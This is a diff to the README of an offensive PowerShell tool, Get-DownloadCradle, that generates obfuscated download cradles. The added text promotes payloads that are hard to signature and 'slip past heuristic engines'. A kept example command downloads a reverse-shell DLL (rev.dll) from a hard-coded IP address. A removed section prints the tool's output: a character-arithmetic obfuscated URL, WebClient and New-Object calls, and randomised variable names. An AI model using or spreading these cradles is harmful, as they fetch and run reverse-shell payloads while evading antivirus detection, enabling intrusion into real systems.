@@ -1,6 +1,8 @@
 # Obfuscated PowerShell Download Cradles
 
-Get-DownloadCradle is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated download cradles for PowerShell. With the way this framework is built, each component of the original payload goes through a randomly selected generator, resulting in a different yield with every execution of this script. 
+Get-DownloadCradle is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated download cradles for PowerShell.
+
+With the way the underlying framework has been written, each execution of this script will produce a different payload. In addition to this as well as the relative complexity of the obfuscation logic, the resulting payloads will be very difficult to signature and will slip past heuristic engines that are not programmed to emulate the inherited code.
 
 ## Cradle Templates
 
@@ -89,28 +91,3 @@ __DownloadData__
 __Output to File__
 
 `Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -OutFile obfuscated.ps1`
-
-__Show Changes__
-
-Where this script has been built from `Invoke-PSObfuscation`, we have the ability to target specific script components vs all of them at the same time. In addition to this, if we wanted to learn more about what was obfuscated, we can include the `ShowChanges` parameter. This will instruct the script to display each targeted component, the obfuscated value that will be replacing it and the generator value that was used. 
-
-```shell
-──(kali㉿kali)-[/home/kali]
-└─PS> Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -ShowChanges
-
-     >> Layer 0 Download Cradle
-     >> https://github.com/gh0x0st
-
-    Generator 2 >> http://192.168.49.80/rev.dll >> $([char](51+104-51)+[char](0+116-0)+[char](0+116-0)+[char](0+112-0)+[char](30+58-30)+[char](0+47-0)+[char](73*47/73)+[char](25*49/25)+[char](45+57-45)+[char](58+50-58)+[char](102+46-102)+[char](0+49-0)+[char](78*54/78)+[char](113*56/113)+[char](26*46/26)+[char](18*52/18)+[char](69*57/69)+[char](98*46/98)+[char](15*56/15)+[char](24*48/24)+[char](0+47-0)+[char](48+114-48)+[char](118*101/118)+[char](0+118-0)+[char](0+46-0)+[char](0+100-0)+[char](45*108/45)+[char](0+108-0))
-    Generator 3 >> DLL_Payload.ReverseShell >> $($($('D'+'L'+'L'+'_'+'P'+'a'+'y'+'l'+'o'+'a'+'d'+'.'+'R'+'e'+'v'+'e'+'r'+'s'+'e'+'S'+'h'+'e'+'l'+'l')))
-    Generator 3 >> runner >> ($($('r'+'u'+'n'+'n'+'e'+'r')))
-    Generator 2 >> System.Net.WebClient >> $([char](0+83-0)+[char](76+121-76)+[char](118+115-118)+[char](98+116-98)+[char](91*101/91)+[char](2*109/2)+[char](105*46/105)+[char](0+78-0)+[char](51*101/51)+[char](0+116-0)+[char](23+46-23)+[char](0+87-0)+[char](0+101-0)+[char](0+98-0)+[char](111+67-111)+[char](54*108/54)+[char](0+105-0)+[char](52+101-52)+[char](42*110/42)+[char](0+116-0))
-    Generator 2 >> New-Object >> & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_})
-    Generator 5 >> | >> |<##>%{$_}|
-    Generator 11 >> | >> |ForEach-Object{$_}|ForEach-Object{$_}|
-    Generator 2 >> $WebClient >> $rOG6V9jBlcgSL3DnfKy1vs
-    Generator 3 >> $Data >> $MH6VTazWPsQbu8z
-    Generator 3 >> $Assem >> $SIsYjqGeX8bayA2nuPRC
-    Generator 3 >> $Class >> $fD
-    Generator 2 >> $Method >> $5osQqa0YTMZIUt6Vu9D
-```
